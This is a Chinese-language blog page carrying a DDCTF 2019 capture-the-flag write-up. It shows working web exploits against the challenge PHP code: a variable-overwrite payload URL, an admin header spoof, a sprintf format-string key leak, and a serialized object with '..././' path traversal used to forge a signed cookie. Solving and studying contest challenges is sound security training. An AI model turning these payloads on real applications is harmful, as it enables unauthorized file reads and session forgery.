<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">29</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><nav id="nav" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="site-info"><div id="site-title">J0k3r</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/zhuxianjin"><i class="fa-github fa"></i></a><a class="social-icon" href="mailto:xavier.chu@foxmail.com"><i class="fa-envelope fa"></i></a><a class="social-icon" href="http://t.cn/ExVP77H"><i class="fa-qq fa"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=375588920"><i class="fa-music fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/22/ddctf2019/">DDCTF 2019 WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<h2 id="滴～"><a href="#滴～" class="headerlink" title="滴～"></a>滴～</h2><p>读 index.php 文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在给的博客 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80616607" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80616607</a> 中找到 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a></p>
<p>practice.txt.swp 得到</p>
<p>f1ag!ddctf.php</p>
<p>转 hex 加两次 base64 读 f1ag!ddctf.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>变量覆盖</p>
<p>payload： <code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=</code></p>
<p>flag</p>
<p><code>DDCTF{436f6e67726174756c6174696f6e73}</code></p>
<hr>
<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>由 index.js 发现 auth() 函数中的 ajax 请求</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>burpsuite 抓包带 didictf_username header 头请求 app/Auth.php</p>
<p>测试当 didictf_username 为 admin 时返回 success 的 json 数据，得到 app/fL2XID2i0Cdh.php</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"errMsg"</span>:<span class="string">"success"</span>,<span class="attr">"data"</span>:<span class="string">"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>访问能得到 app/Application.php 和 app/Session.php 源码</p>
<p>app/Application.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>app/Session.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure>
<p>查看源码后得知具体流程为</p>
<p>利用 Session.php 的 sprintf 格式化字符串漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">	$arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">	$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">	$data = sprintf($data,$v);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>传入 nickname 为 <code>%s</code> 格式化字符串得到 eancrykey</p>
<p>eancrykey: <code>EzblrbNS</code></p>
<p>利用 Application 的析构函数 __destruct() 读 flag 文件，根据提示 <code>//eancrykey  and flag under the folder</code>，flag 应在 <code>../config/flag.txt</code></p>
<p>序列化 Application 定义 <code>var $path = &#39;..././config/flag.txt&#39;;</code> 双写 ../ 绕过 sanitizepath 函数过滤得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"Application"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">21</span>:<span class="string">"..././config/flag.txt"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>伪造 ddctf_id</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> md5(<span class="string">'EzblrbNS'</span>.<span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</span><br><span class="line"><span class="number">5</span>a014dbe49334e6dbb7326046950bee2</span><br></pre></td></tr></table></figure>
<p>getflag</p>
